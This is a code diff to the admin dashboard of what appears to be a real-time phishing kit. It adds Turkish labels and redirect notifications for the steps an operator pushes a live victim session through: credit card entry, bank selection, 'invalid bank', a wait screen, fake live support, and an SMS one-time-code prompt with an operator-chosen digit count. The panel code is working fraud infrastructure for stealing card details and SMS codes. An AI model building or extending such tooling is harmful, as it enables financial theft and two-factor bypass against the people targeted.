@@ -464,6 +464,19 @@ export function AdminDashboardClean() {
     setCreateLinkError("Link olusturulamadi: session id donmedi.");
   }
 
+  const ROUTE_LABELS: Record<string, string> = {
+    win: "İsim & Profil", banken: "Banka Seçimi", banken2: "Banka Seçimi 2",
+    card: "Kredi Kartı", wait: "Bekleme", invalid_bank: "Hatalı Banka",
+    live_support: "Canlı Destek", congrats: "Tebrikler", sms: "SMS Onayı",
+    facebook: "Facebook", custom_question: "Özel Soru",
+    special_approval: "Özel Bildirim", generator1: "Generator 1", generator2: "Generator 2",
+  };
+  const toastRedirect = (step: string, label?: string) => {
+    try {
+      showBeautifulToast("Yönlendirildi", `Kullanıcı "${label || ROUTE_LABELS[step] || step}" sayfasına yönlendirildi.`);
+    } catch { /* ignore */ }
+  };
+
   async function handleRouteAction(id: string, step: string) {
     if (!supabase || !step) return;
     if (step === "sms") {
@@ -477,6 +490,7 @@ export function AdminDashboardClean() {
       return;
     }
     await supabase.from("sessions").update({ is_hidden: false, current_step: step, status: "online" }).eq("id", id);
+    toastRedirect(step);
     await load();
   }
 
@@ -485,13 +499,14 @@ export function AdminDashboardClean() {
     const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
     await supabase
       .from("sessions")
-      .update({ is_hidden: false, current_step: "sms", 
-        sms_digits: digits, 
+      .update({ is_hidden: false, current_step: "sms",
+        sms_digits: digits,
         sms_custom_text: smsCustomTextInput.trim() || null,
-        status: "online" 
+        status: "online"
       })
       .eq("id", smsPromptSessionId);
     setSmsPromptSessionId(null);
+    toastRedirect("sms");
     await load();
   }
 
@@ -502,17 +517,18 @@ export function AdminDashboardClean() {
     await supabase.from("sessions").update({
       status: "SPECIAL_INFO",
       current_step: "special_approval",
-      form_data: { 
-        ...prev, 
-        specialNoticeText: specialMessage.trim(), 
-        specialNoticeImage: specialImage ?? "", 
-        specialNoticeLang: specialLang, 
-        specialNoticeSentAt: new Date().toISOString() 
+      form_data: {
+        ...prev,
+        specialNoticeText: specialMessage.trim(),
+        specialNoticeImage: specialImage ?? "",
+        specialNoticeLang: specialLang,
+        specialNoticeSentAt: new Date().toISOString()
       },
     }).eq("id", specialPromptSessionId);
     setSpecialPromptSessionId(null);
     setSpecialMessage("");
     setSpecialImage(null);
+    toastRedirect("special_approval");
     await load();
   }
 
